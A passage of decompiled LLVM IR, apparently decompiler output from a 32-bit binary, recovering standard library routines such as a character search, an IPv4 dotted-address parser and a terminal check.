dec_label_pc_17d1c:                               ; preds = %dec_label_pc_17d10, %dec_label_pc_17cf0
  %v0_17d20 = phi i32 [ %v0_17d142, %dec_label_pc_17cf0 ], [ %v1_17d10, %dec_label_pc_17d10 ]
  %v4_17d1c = mul nuw nsw i32 %v1_17cf4, 256
  %v5_17d1c = or i32 %v4_17d1c, %v1_17cf4
  %v4_17d24 = mul i32 %v5_17d1c, 65536
  %v5_17d24 = or i32 %v4_17d24, %v5_17d1c
  br label %dec_label_pc_17d28

dec_label_pc_17d28:                               ; preds = %dec_label_pc_17dc4, %dec_label_pc_17d64, %dec_label_pc_17d1c
  %v0_17d8c = phi i32 [ %v0_17d20, %dec_label_pc_17d1c ], [ %v4_17d28, %dec_label_pc_17d64 ], [ %v4_17d28, %dec_label_pc_17dc4 ]
  %v1_17d28 = inttoptr i32 %v0_17d8c to i32*
  %v2_17d28 = load i32, i32* %v1_17d28, align 4
  %v4_17d28 = add i32 %v0_17d8c, 4
  %v2_17d30 = xor i32 %v2_17d28, %v5_17d24
  %v2_17d34 = add i32 %v2_17d30, 2130640639
  store i32 %v2_17d34, i32* @ip, align 4
  %v2_17d3c = add i32 %v2_17d28, 2130640639
  %v1_17d40 = sub i32 -1, %v2_17d28
  %v2_17d44 = xor i32 %v2_17d3c, %v1_17d40
  %v2_17d50 = and i32 %v2_17d44, -2130640640
  %v2_17d58 = icmp eq i32 %v2_17d50, 0
  br i1 %v2_17d58, label %dec_label_pc_17d64, label %dec_label_pc_17d6c

dec_label_pc_17d64:                               ; preds = %dec_label_pc_17d28
  %v1_17d4c = sub i32 -1, %v2_17d30
  %v2_17d54 = xor i32 %v2_17d34, %v1_17d4c
  %v2_17d5c = and i32 %v2_17d54, -2130640640
  %v2_17d64 = icmp eq i32 %v2_17d5c, 0
  br i1 %v2_17d64, label %dec_label_pc_17d28, label %dec_label_pc_17d6c

dec_label_pc_17d6c:                               ; preds = %dec_label_pc_17d28, %dec_label_pc_17d64
  %v2_17d6c = inttoptr i32 %v0_17d8c to i8*
  %v3_17d6c = load i8, i8* %v2_17d6c, align 1
  %v4_17d6c = zext i8 %v3_17d6c to i32
  %v9_17d70 = icmp eq i32 %v4_17d6c, %v1_17cf4
  br i1 %v9_17d70, label %dec_label_pc_17dcc, label %dec_label_pc_17d7c

dec_label_pc_17d7c:                               ; preds = %dec_label_pc_17d6c
  %v2_17d7c = icmp eq i8 %v3_17d6c, 0
  br i1 %v2_17d7c, label %dec_label_pc_17dcc, label %dec_label_pc_17d84

dec_label_pc_17d84:                               ; preds = %dec_label_pc_17d7c
  %v1_17d84 = add i32 %v0_17d8c, 1
  %v2_17d84 = inttoptr i32 %v1_17d84 to i8*
  %v3_17d84 = load i8, i8* %v2_17d84, align 1
  %v4_17d84 = zext i8 %v3_17d84 to i32
  %v9_17d88 = icmp eq i32 %v4_17d84, %v1_17cf4
  br i1 %v9_17d88, label %dec_label_pc_17dcc, label %dec_label_pc_17d94

dec_label_pc_17d94:                               ; preds = %dec_label_pc_17d84
  %v2_17d94 = icmp eq i8 %v3_17d84, 0
  br i1 %v2_17d94, label %dec_label_pc_17dcc, label %dec_label_pc_17d9c

dec_label_pc_17d9c:                               ; preds = %dec_label_pc_17d94
  %v1_17d9c = add i32 %v0_17d8c, 2
  %v2_17d9c = inttoptr i32 %v1_17d9c to i8*
  %v3_17d9c = load i8, i8* %v2_17d9c, align 1
  %v4_17d9c = zext i8 %v3_17d9c to i32
  %v9_17da0 = icmp eq i32 %v4_17d9c, %v1_17cf4
  br i1 %v9_17da0, label %dec_label_pc_17dcc, label %dec_label_pc_17dac

dec_label_pc_17dac:                               ; preds = %dec_label_pc_17d9c
  %v2_17dac = icmp eq i8 %v3_17d9c, 0
  br i1 %v2_17dac, label %dec_label_pc_17dcc, label %dec_label_pc_17db4

dec_label_pc_17db4:                               ; preds = %dec_label_pc_17dac
  %v1_17db4 = add i32 %v0_17d8c, 3
  %v2_17db4 = inttoptr i32 %v1_17db4 to i8*
  %v3_17db4 = load i8, i8* %v2_17db4, align 1
  %v4_17db4 = zext i8 %v3_17db4 to i32
  %v9_17db8 = icmp eq i32 %v4_17db4, %v1_17cf4
  br i1 %v9_17db8, label %dec_label_pc_17dcc, label %dec_label_pc_17dc4

dec_label_pc_17dc4:                               ; preds = %dec_label_pc_17db4
  %v2_17dc4 = icmp eq i8 %v3_17db4, 0
  br i1 %v2_17dc4, label %dec_label_pc_17dcc, label %dec_label_pc_17d28

dec_label_pc_17dcc:                               ; preds = %dec_label_pc_17d08, %dec_label_pc_17cfc, %dec_label_pc_17dc4, %dec_label_pc_17db4, %dec_label_pc_17dac, %dec_label_pc_17d9c, %dec_label_pc_17d94, %dec_label_pc_17d84, %dec_label_pc_17d7c, %dec_label_pc_17d6c
  %v1_17dd0 = phi i32 [ %v1_17db4, %dec_label_pc_17dc4 ], [ %v1_17db4, %dec_label_pc_17db4 ], [ %v1_17d9c, %dec_label_pc_17dac ], [ %v1_17d9c, %dec_label_pc_17d9c ], [ %v1_17d84, %dec_label_pc_17d94 ], [ %v1_17d84, %dec_label_pc_17d84 ], [ %v0_17d8c, %dec_label_pc_17d7c ], [ %v0_17d8c, %dec_label_pc_17d6c ], [ %v0_17d10, %dec_label_pc_17cfc ], [ %v0_17d10, %dec_label_pc_17d08 ]
  ret i32 %v1_17dd0

; uselistorder directives
  uselistorder i32 %v4_17d28, { 1, 0 }
  uselistorder i32 %v2_17d28, { 0, 2, 1 }
  uselistorder i32 %v0_17d8c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_17d1c, { 1, 0 }
  uselistorder i32 %v1_17d10, { 1, 0, 2 }
  uselistorder i32 %v0_17d142, { 2, 1, 0 }
  uselistorder i32 %v1_17cf4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_17dcc, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_17d6c, { 1, 0 }
  uselistorder label %dec_label_pc_17cfc, { 1, 0 }
}

define i32 @function_17ddc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17ddc:
  %v1_17de0 = urem i32 %arg1, 256
  %v0_17e003 = load i32, i32* @r0, align 4
  %v1_17e004 = urem i32 %v0_17e003, 4
  %v2_17e005 = icmp eq i32 %v1_17e004, 0
  br i1 %v2_17e005, label %dec_label_pc_17e08, label %dec_label_pc_17de8

dec_label_pc_17de8:                               ; preds = %dec_label_pc_17ddc, %dec_label_pc_17dfc
  %v0_17dfc = phi i32 [ %v1_17dfc, %dec_label_pc_17dfc ], [ %v0_17e003, %dec_label_pc_17ddc ]
  %v1_17de8 = inttoptr i32 %v0_17dfc to i8*
  %v2_17de8 = load i8, i8* %v1_17de8, align 1
  %v3_17de8 = zext i8 %v2_17de8 to i32
  %v9_17dec = icmp eq i32 %v3_17de8, %v1_17de0
  br i1 %v9_17dec, label %dec_label_pc_17ebc, label %dec_label_pc_17df4

dec_label_pc_17df4:                               ; preds = %dec_label_pc_17de8
  %v2_17df4 = icmp eq i8 %v2_17de8, 0
  br i1 %v2_17df4, label %dec_label_pc_17eb8, label %dec_label_pc_17dfc

dec_label_pc_17dfc:                               ; preds = %dec_label_pc_17df4
  %v1_17dfc = add i32 %v0_17dfc, 1
  %v1_17e00 = urem i32 %v1_17dfc, 4
  %v2_17e00 = icmp eq i32 %v1_17e00, 0
  br i1 %v2_17e00, label %dec_label_pc_17e08, label %dec_label_pc_17de8

dec_label_pc_17e08:                               ; preds = %dec_label_pc_17dfc, %dec_label_pc_17ddc
  %v0_17e0c = phi i32 [ %v0_17e003, %dec_label_pc_17ddc ], [ %v1_17dfc, %dec_label_pc_17dfc ]
  %v4_17e08 = mul nuw nsw i32 %v1_17de0, 256
  %v5_17e08 = or i32 %v4_17e08, %v1_17de0
  %v4_17e10 = mul i32 %v5_17e08, 65536
  %v5_17e10 = or i32 %v4_17e10, %v5_17e08
  br label %dec_label_pc_17e14

dec_label_pc_17e14:                               ; preds = %dec_label_pc_17eb0, %dec_label_pc_17e50, %dec_label_pc_17e08
  %v0_17e78 = phi i32 [ %v0_17e0c, %dec_label_pc_17e08 ], [ %v4_17e14, %dec_label_pc_17e50 ], [ %v4_17e14, %dec_label_pc_17eb0 ]
  %v1_17e14 = inttoptr i32 %v0_17e78 to i32*
  %v2_17e14 = load i32, i32* %v1_17e14, align 4
  %v4_17e14 = add i32 %v0_17e78, 4
  %v2_17e1c = xor i32 %v2_17e14, %v5_17e10
  %v2_17e20 = add i32 %v2_17e1c, 2130640639
  store i32 %v2_17e20, i32* @ip, align 4
  %v2_17e28 = add i32 %v2_17e14, 2130640639
  %v1_17e2c = sub i32 -1, %v2_17e14
  %v2_17e30 = xor i32 %v2_17e28, %v1_17e2c
  %v2_17e3c = and i32 %v2_17e30, -2130640640
  %v2_17e44 = icmp eq i32 %v2_17e3c, 0
  br i1 %v2_17e44, label %dec_label_pc_17e50, label %dec_label_pc_17e58

dec_label_pc_17e50:                               ; preds = %dec_label_pc_17e14
  %v1_17e38 = sub i32 -1, %v2_17e1c
  %v2_17e40 = xor i32 %v2_17e20, %v1_17e38
  %v2_17e48 = and i32 %v2_17e40, -2130640640
  %v2_17e50 = icmp eq i32 %v2_17e48, 0
  br i1 %v2_17e50, label %dec_label_pc_17e14, label %dec_label_pc_17e58

dec_label_pc_17e58:                               ; preds = %dec_label_pc_17e14, %dec_label_pc_17e50
  %v2_17e58 = inttoptr i32 %v0_17e78 to i8*
  %v3_17e58 = load i8, i8* %v2_17e58, align 1
  %v4_17e58 = zext i8 %v3_17e58 to i32
  %v9_17e5c = icmp eq i32 %v4_17e58, %v1_17de0
  br i1 %v9_17e5c, label %dec_label_pc_17ebc, label %dec_label_pc_17e68

dec_label_pc_17e68:                               ; preds = %dec_label_pc_17e58
  %v2_17e68 = icmp eq i8 %v3_17e58, 0
  br i1 %v2_17e68, label %dec_label_pc_17eb8, label %dec_label_pc_17e70

dec_label_pc_17e70:                               ; preds = %dec_label_pc_17e68
  %v1_17e70 = add i32 %v0_17e78, 1
  %v2_17e70 = inttoptr i32 %v1_17e70 to i8*
  %v3_17e70 = load i8, i8* %v2_17e70, align 1
  %v4_17e70 = zext i8 %v3_17e70 to i32
  %v9_17e74 = icmp eq i32 %v4_17e70, %v1_17de0
  br i1 %v9_17e74, label %dec_label_pc_17ebc, label %dec_label_pc_17e80

dec_label_pc_17e80:                               ; preds = %dec_label_pc_17e70
  %v2_17e80 = icmp eq i8 %v3_17e70, 0
  br i1 %v2_17e80, label %dec_label_pc_17eb8, label %dec_label_pc_17e88

dec_label_pc_17e88:                               ; preds = %dec_label_pc_17e80
  %v1_17e88 = add i32 %v0_17e78, 2
  %v2_17e88 = inttoptr i32 %v1_17e88 to i8*
  %v3_17e88 = load i8, i8* %v2_17e88, align 1
  %v4_17e88 = zext i8 %v3_17e88 to i32
  %v9_17e8c = icmp eq i32 %v4_17e88, %v1_17de0
  br i1 %v9_17e8c, label %dec_label_pc_17ebc, label %dec_label_pc_17e98

dec_label_pc_17e98:                               ; preds = %dec_label_pc_17e88
  %v2_17e98 = icmp eq i8 %v3_17e88, 0
  br i1 %v2_17e98, label %dec_label_pc_17eb8, label %dec_label_pc_17ea0

dec_label_pc_17ea0:                               ; preds = %dec_label_pc_17e98
  %v1_17ea0 = add i32 %v0_17e78, 3
  %v2_17ea0 = inttoptr i32 %v1_17ea0 to i8*
  %v3_17ea0 = load i8, i8* %v2_17ea0, align 1
  %v4_17ea0 = zext i8 %v3_17ea0 to i32
  %v9_17ea4 = icmp eq i32 %v4_17ea0, %v1_17de0
  br i1 %v9_17ea4, label %dec_label_pc_17ebc, label %dec_label_pc_17eb0

dec_label_pc_17eb0:                               ; preds = %dec_label_pc_17ea0
  %v2_17eb0 = icmp eq i8 %v3_17ea0, 0
  br i1 %v2_17eb0, label %dec_label_pc_17eb8, label %dec_label_pc_17e14

dec_label_pc_17eb8:                               ; preds = %dec_label_pc_17df4, %dec_label_pc_17eb0, %dec_label_pc_17e98, %dec_label_pc_17e80, %dec_label_pc_17e68
  br label %dec_label_pc_17ebc

dec_label_pc_17ebc:                               ; preds = %dec_label_pc_17de8, %dec_label_pc_17ea0, %dec_label_pc_17e88, %dec_label_pc_17e70, %dec_label_pc_17e58, %dec_label_pc_17eb8
  %v1_17ec0 = phi i32 [ 0, %dec_label_pc_17eb8 ], [ %v1_17ea0, %dec_label_pc_17ea0 ], [ %v1_17e88, %dec_label_pc_17e88 ], [ %v1_17e70, %dec_label_pc_17e70 ], [ %v0_17e78, %dec_label_pc_17e58 ], [ %v0_17dfc, %dec_label_pc_17de8 ]
  ret i32 %v1_17ec0

; uselistorder directives
  uselistorder i32 %v4_17e14, { 1, 0 }
  uselistorder i32 %v2_17e14, { 0, 2, 1 }
  uselistorder i32 %v0_17e78, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_17e08, { 1, 0 }
  uselistorder i32 %v1_17dfc, { 1, 0, 2 }
  uselistorder i32 %v0_17e003, { 2, 1, 0 }
  uselistorder i32 %v1_17de0, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 3, { 3, 4, 1, 5, 68, 69, 131, 70, 71, 72, 73, 74, 75, 82, 83, 132, 7, 124, 27, 125, 26, 126, 39, 127, 76, 128, 77, 40, 84, 28, 85, 86, 2, 87, 88, 89, 41, 8, 113, 42, 114, 43, 115, 44, 116, 45, 117, 46, 118, 47, 119, 29, 120, 48, 121, 49, 122, 50, 90, 51, 91, 30, 94, 52, 53, 54, 55, 0, 92, 93, 56, 10, 9, 57, 95, 31, 96, 12, 11, 58, 32, 97, 14, 13, 59, 98, 33, 99, 100, 16, 15, 60, 101, 34, 102, 18, 17, 61, 103, 35, 104, 63, 105, 20, 19, 62, 106, 36, 107, 22, 21, 64, 108, 37, 109, 24, 23, 65, 110, 38, 111, 25, 112, 6, 123, 129, 78, 79, 80, 81, 66, 130, 67 }
  uselistorder i32 2130640639, { 0, 2, 1, 3 }
  uselistorder i32 65536, { 4, 5, 7, 6, 12, 8, 13, 9, 14, 10, 15, 11, 16, 17, 18, 22, 19, 23, 20, 24, 21, 25, 142, 145, 141, 146, 26, 27, 28, 29, 30, 31, 32, 33, 34, 140, 35, 36, 37, 39, 38, 41, 40, 42, 43, 44, 2, 45, 0, 3, 46, 47, 49, 48, 1, 52, 50, 51, 53, 58, 54, 59, 55, 60, 56, 57, 61, 62, 63, 64, 66, 67, 65, 139, 69, 68, 72, 73, 74, 70, 71, 77, 75, 78, 76, 79, 80, 81, 82, 83, 85, 86, 84, 87, 143, 89, 88, 92, 93, 94, 90, 91, 95, 96, 98, 99, 100, 97, 101, 144, 102, 104, 103, 106, 105, 107, 114, 108, 115, 109, 116, 110, 117, 111, 118, 112, 113, 120, 119, 121, 122, 123, 124, 129, 125, 130, 126, 131, 127, 128, 133, 132, 134, 135, 136, 138, 137 }
  uselistorder label %dec_label_pc_17ebc, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_17eb8, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_17e58, { 1, 0 }
  uselistorder label %dec_label_pc_17de8, { 1, 0 }
}

define i32 @function_17ecc(i32 %arg1) local_unnamed_addr {
dec_label_pc_17ecc:
  %stack_var_-68 = alloca i32, align 4
  %v2_17ed4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_17ed4, i32* @r1, align 4
  %v0_17ed8 = call i32 @function_17ef0()
  %v1_17edc = sub i32 1, %v0_17ed8
  %v2_17edc = icmp ult i32 %v0_17ed8, 2
  br i1 %v2_17edc, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_17ecc
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_17ecc, %bb
  %v1_17eec = phi i32 [ %v1_17edc, %dec_label_pc_17ecc ], [ 0, %bb ]
  ret i32 %v1_17eec

; uselistorder directives
  uselistorder i32 %v0_17ed8, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_17ef0() local_unnamed_addr {
dec_label_pc_17ef0:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_17ef0 = load i32, i32* @r4, align 4
  %v6_17ef0 = load i32, i32* @r5, align 4
  %v2_17ef8 = ptrtoint i32* %stack_var_-52 to i32
  %v0_17efc = load i32, i32* @r1, align 4
  store i32 %v0_17efc, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_17f08 = load i32, i32* @r0, align 4
  %v3_17f08 = call i32 @function_130c0(i32 %v0_17f08, i32 21505, i32 %v2_17ef8)
  store i32 %v3_17f08, i32* %r0.global-to-local, align 4
  store i32 %v3_17f08, i32* @r5, align 4
  %v2_17f0c = icmp eq i32 %v3_17f08, 0
  br i1 %v2_17f0c, label %dec_label_pc_17f14, label %dec_label_pc_17f58

dec_label_pc_17f14:                               ; preds = %dec_label_pc_17ef0
  %v4_17f20 = zext i8 %tmp to i32
  store i32 %v4_17f20, i32* @ip, align 4
  %v3_17f24 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_17f24, i32* @r3, align 4
  %v1_17f28 = load i32, i32* @r4, align 4
  %v2_17f28 = add i32 %v1_17f28, 4
  %v3_17f28 = inttoptr i32 %v2_17f28 to i32*
  %v0_17f2c = load i32, i32* %r1.global-to-local, align 4
  %v1_17f2c = load i32, i32* @r4, align 4
  %v2_17f2c = add i32 %v1_17f2c, 8
  %v3_17f2c = inttoptr i32 %v2_17f2c to i32*
  store i32 %v0_17f2c, i32* %v3_17f2c, align 4
  %v0_17f30 = load i32, i32* %r0.global-to-local, align 4
  %v1_17f30 = load i32, i32* @r4, align 4
  %v2_17f30 = add i32 %v1_17f30, 12
  %v3_17f30 = inttoptr i32 %v2_17f30 to i32*
  store i32 %v0_17f30, i32* %v3_17f30, align 4
  %v2_17f34 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_17f34, i32* @r1, align 4
  %v1_17f3c = load i32, i32* @r4, align 4
  %v2_17f3c = inttoptr i32 %v1_17f3c to i32*
  store i32 %v3_17f24, i32* %v2_17f3c, align 4
  %v0_17f40 = load i32, i32* @ip, align 4
  %v1_17f40 = trunc i32 %v0_17f40 to i8
  %v2_17f40 = load i32, i32* @r4, align 4
  %v3_17f40 = add i32 %v2_17f40, 16
  %v4_17f40 = inttoptr i32 %v3_17f40 to i8*
  store i8 %v1_17f40, i8* %v4_17f40, align 1
  %v0_17f44 = load i32, i32* @r4, align 4
  %v1_17f44 = add i32 %v0_17f44, 17
  store i32 %v1_17f44, i32* %r0.global-to-local, align 4
  %v4_17f48 = call i32 @function_18434(i32 %v1_17f44, i32 %v2_17f34, i32 19, i32 %v3_17f24)
  store i32 %v4_17f48, i32* %r0.global-to-local, align 4
  %v0_17f4c = load i32, i32* @r5, align 4
  store i32 %v0_17f4c, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_17f54 = inttoptr i32 %v4_17f48 to i8*
  %v3_17f54 = call i32 @function_135d0(i8* %v2_17f54, i32 %v0_17f4c)
  store i32 %v3_17f54, i32* %r0.global-to-local, align 4
  %v0_17f58.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17f58

dec_label_pc_17f58:                               ; preds = %dec_label_pc_17ef0, %dec_label_pc_17f14
  %v0_17f58 = phi i32 [ %v3_17f08, %dec_label_pc_17ef0 ], [ %v0_17f58.pre, %dec_label_pc_17f14 ]
  store i32 %v0_17f58, i32* %r0.global-to-local, align 4
  store i32 %v3_17ef0, i32* @r4, align 4
  store i32 %v6_17ef0, i32* @r5, align 4
  ret i32 %v0_17f58

; uselistorder directives
  uselistorder i32 %v0_17f58, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 (i8*, i32)* @function_135d0, { 2, 3, 4, 5, 0, 1, 12, 11, 9, 6, 7, 8, 10 }
  uselistorder i32 13, { 13, 12, 0, 1, 5, 14, 16, 17, 15, 47, 2, 3, 6, 7, 8, 9, 18, 19, 20, 21, 22, 23, 24, 10, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 11, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 4, 45, 46 }
  uselistorder i32 17, { 10, 1, 2, 11, 12, 24, 13, 14, 5, 15, 6, 16, 7, 17, 18, 8, 19, 9, 3, 20, 4, 21, 22, 23, 0 }
  uselistorder i32 (i32, i32, i32)* @function_130c0, { 1, 0 }
  uselistorder label %dec_label_pc_17f58, { 1, 0 }
}

define i32 @function_17f6c() local_unnamed_addr {
dec_label_pc_17f6c:
  %r0.global-to-local = alloca i32, align 4
  %v0_17f74 = load i32, i32* @r0, align 4
  %v2_17f74 = icmp eq i32 %v0_17f74, 0
  %v0_17f7c = load i32, i32* @r1, align 4
  br i1 %v2_17f74, label %dec_label_pc_18050, label %dec_label_pc_17f84

dec_label_pc_17f84:                               ; preds = %dec_label_pc_17f6c
  br label %dec_label_pc_17f9c

dec_label_pc_17f9c:                               ; preds = %dec_label_pc_17f84, %dec_label_pc_18014
  %v1_18014 = phi i32 [ 0, %dec_label_pc_17f84 ], [ %v5_18014, %dec_label_pc_18014 ]
  %v0_18018 = phi i32 [ 1, %dec_label_pc_17f84 ], [ %v1_18018, %dec_label_pc_18014 ]
  %v0_17f9c = phi i32 [ %v0_17f74, %dec_label_pc_17f84 ], [ %v0_17f9c12, %dec_label_pc_18014 ]
  %v1_17f9c = inttoptr i32 %v0_17f9c to i8*
  %v2_17f9c = load i8, i8* %v1_17f9c, align 1
  %v3_17f9c = zext i8 %v2_17f9c to i32
  %v4_17fa0 = load i32, i32* inttoptr (i32 135568 to i32*), align 16
  %v2_17fa4 = mul nuw nsw i32 %v3_17f9c, 2
  %v2_17fa8 = add i32 %v2_17fa4, %v4_17fa0
  %v3_17fa8 = inttoptr i32 %v2_17fa8 to i16*
  %v4_17fa8 = load i16, i16* %v3_17fa8, align 2
  %v1_17fac = and i16 %v4_17fa8, 8
  %v2_17fac = icmp eq i16 %v1_17fac, 0
  br i1 %v2_17fac, label %dec_label_pc_18050, label %dec_label_pc_17fb4

dec_label_pc_17fb4:                               ; preds = %dec_label_pc_17f9c
  br label %dec_label_pc_17fd4

dec_label_pc_17fbc:                               ; preds = %dec_label_pc_17fd4
  %v2_17fbc = mul i32 %v0_18014, 10
  %v1_17fc0 = add i32 %v2_17fbc, -48
  %v2_17fc4 = add i32 %v3_17fd4, %v1_17fc0
  %v8_17fcc = icmp sgt i32 %v2_17fc4, 255
  br i1 %v8_17fcc, label %dec_label_pc_18050, label %dec_label_pc_17fd0

dec_label_pc_17fd0:                               ; preds = %dec_label_pc_17fbc
  %v1_17fd0 = add i32 %v0_18004, 1
  store i32 %v1_17fd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17fd4

dec_label_pc_17fd4:                               ; preds = %dec_label_pc_17fb4, %dec_label_pc_17fd0
  %v0_18014 = phi i32 [ 0, %dec_label_pc_17fb4 ], [ %v2_17fc4, %dec_label_pc_17fd0 ]
  %v0_18004 = phi i32 [ %v0_17f9c, %dec_label_pc_17fb4 ], [ %v1_17fd0, %dec_label_pc_17fd0 ]
  %v1_17fd4 = inttoptr i32 %v0_18004 to i8*
  %v2_17fd4 = load i8, i8* %v1_17fd4, align 1
  %v3_17fd4 = zext i8 %v2_17fd4 to i32
  %v2_17fd8 = mul nuw nsw i32 %v3_17fd4, 2
  %v2_17fdc = add i32 %v2_17fd8, %v4_17fa0
  %v3_17fdc = inttoptr i32 %v2_17fdc to i16*
  %v4_17fdc = load i16, i16* %v3_17fdc, align 2
  %v6_17fdc = zext i16 %v4_17fdc to i32
  %v1_17fe0 = and i32 %v6_17fdc, 8
  %v2_17fe0 = icmp eq i32 %v1_17fe0, 0
  br i1 %v2_17fe0, label %dec_label_pc_17fe8, label %dec_label_pc_17fbc

dec_label_pc_17fe8:                               ; preds = %dec_label_pc_17fd4
  %v7_17fe8 = icmp eq i32 %v0_18018, 4
  br i1 %v7_17fe8, label %dec_label_pc_18000, label %dec_label_pc_17ff0

dec_label_pc_17ff0:                               ; preds = %dec_label_pc_17fe8
  %v7_17ff0 = icmp eq i8 %v2_17fd4, 46
  br i1 %v7_17ff0, label %dec_label_pc_17ff8, label %dec_label_pc_18050

dec_label_pc_17ff8:                               ; preds = %dec_label_pc_17ff0
  %v1_17ff8 = add i32 %v0_18004, 1
  store i32 %v1_17ff8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18014

dec_label_pc_18000:                               ; preds = %dec_label_pc_17fe8
  %v2_18000 = icmp eq i8 %v2_17fd4, 0
  %v1_18004 = add i32 %v0_18004, 1
  store i32 %v1_18004, i32* %r0.global-to-local, align 4
  br i1 %v2_18000, label %dec_label_pc_18014, label %dec_label_pc_1800c

dec_label_pc_1800c:                               ; preds = %dec_label_pc_18000
  %v1_1800c = and i32 %v6_17fdc, 32
  %v2_1800c = icmp eq i32 %v1_1800c, 0
  br i1 %v2_1800c, label %dec_label_pc_18050, label %dec_label_pc_18014

dec_label_pc_18014:                               ; preds = %dec_label_pc_1800c, %dec_label_pc_18000, %dec_label_pc_17ff8
  %v0_17f9c12 = phi i32 [ %v1_18004, %dec_label_pc_1800c ], [ %v1_18004, %dec_label_pc_18000 ], [ %v1_17ff8, %dec_label_pc_17ff8 ]
  %v4_18014 = mul i32 %v1_18014, 256
  %v5_18014 = or i32 %v0_18014, %v4_18014
  %v1_18018 = add nuw nsw i32 %v0_18018, 1
  %v7_18020 = icmp slt i32 %v1_18018, 5
  br i1 %v7_18020, label %dec_label_pc_17f9c, label %dec_label_pc_18024

dec_label_pc_18024:                               ; preds = %dec_label_pc_18014
  %v2_18024 = icmp eq i32 %v0_17f7c, 0
  br i1 %v2_18024, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_18024
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18054

bb:                                               ; preds = %dec_label_pc_18024
  %v4_18028 = udiv i32 %v5_18014, 16777216
  %v2_1802c = udiv i32 %v5_18014, 256
  %v5_18030 = and i32 %v2_1802c, 65280
  %v2_18034 = and i32 %v5_18014, 65280
  %v5_18038 = mul nuw nsw i32 %v2_18034, 256
  %v5_1803c = mul i32 %v0_18014, 16777216
  %v6_18030 = or i32 %v4_18028, %v5_1803c
  %v6_18038 = or i32 %v6_18030, %v5_18030
  %v6_1803c = or i32 %v6_18038, %v5_18038
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_18048 = inttoptr i32 %v0_17f7c to i32*
  store i32 %v6_1803c, i32* %v3_18048, align 4
  %v1_18058.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18054

dec_label_pc_18050:                               ; preds = %dec_label_pc_17ff0, %dec_label_pc_1800c, %dec_label_pc_17f9c, %dec_label_pc_17fbc, %dec_label_pc_17f6c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18054

dec_label_pc_18054:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_18050
  %v1_18058 = phi i32 [ %v1_18058.pre, %bb ], [ 0, %dec_label_pc_18050 ], [ 1, %.thread7.thread ]
  ret i32 %v1_18058

; uselistorder directives
  uselistorder i32 %v1_18018, { 1, 0 }
  uselistorder i32 %v5_18014, { 2, 0, 1, 3 }
  uselistorder i32 %v0_18004, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 6, 0, 2, 3, 4 }
  uselistorder i32 65280, { 62, 2, 6, 1, 63, 3, 7, 0, 8, 9, 10, 11, 12, 46, 47, 13, 14, 15, 48, 49, 16, 17, 18, 19, 20, 50, 4, 51, 52, 21, 22, 5, 23, 53, 54, 41, 24, 25, 26, 27, 28, 44, 45, 42, 43, 55, 56, 57, 58, 29, 30, 59, 31, 32, 33, 34, 60, 35, 36, 61, 37, 38, 39, 40, 64, 65, 66 }
  uselistorder i32 16777216, { 0, 1, 68, 67, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 31, 30, 33, 32, 38, 34, 39, 35, 36, 37, 40, 41, 42, 43, 44, 45, 46, 47, 51, 48, 52, 49, 50, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66 }
  uselistorder i32 5, { 14, 0, 60, 30, 15, 31, 17, 33, 16, 32, 4, 3, 49, 18, 50, 19, 51, 20, 52, 21, 53, 22, 54, 23, 55, 56, 2, 34, 35, 36, 24, 25, 26, 37, 27, 38, 6, 39, 7, 40, 8, 41, 28, 9, 42, 10, 43, 44, 11, 45, 12, 46, 13, 47, 5, 48, 57, 29, 58, 59, 1 }
  uselistorder i32 32, { 105, 52, 50, 94, 95, 96, 97, 101, 102, 90, 91, 92, 93, 114, 1, 99, 100, 53, 54, 58, 55, 59, 56, 60, 57, 61, 62, 106, 107, 63, 108, 71, 72, 70, 73, 74, 75, 76, 77, 78, 65, 66, 2, 67, 3, 68, 5, 4, 64, 69, 79, 109, 7, 6, 9, 8, 11, 10, 51, 80, 110, 81, 98, 13, 12, 15, 14, 17, 16, 19, 18, 89, 21, 20, 22, 82, 23, 103, 24, 104, 25, 26, 27, 28, 83, 29, 30, 31, 84, 32, 0, 33, 34, 36, 35, 38, 37, 40, 39, 41, 43, 42, 85, 111, 86, 112, 87, 113, 45, 44, 47, 46, 48, 49, 88 }
